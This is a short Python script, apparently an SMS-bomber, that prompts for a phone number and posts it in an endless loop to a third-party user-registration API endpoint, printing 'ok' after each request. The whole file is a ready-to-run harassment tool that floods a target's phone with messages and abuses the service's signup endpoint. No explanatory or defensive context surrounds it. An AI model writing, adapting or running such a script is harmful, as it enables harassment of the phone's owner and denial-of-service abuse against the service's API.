import requests
from termcolor import colored

url = 'https://tap33.me/api/v2/user'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:

      req = requests.post(url, json= pnd)

      print(colored('ok', 'green'))

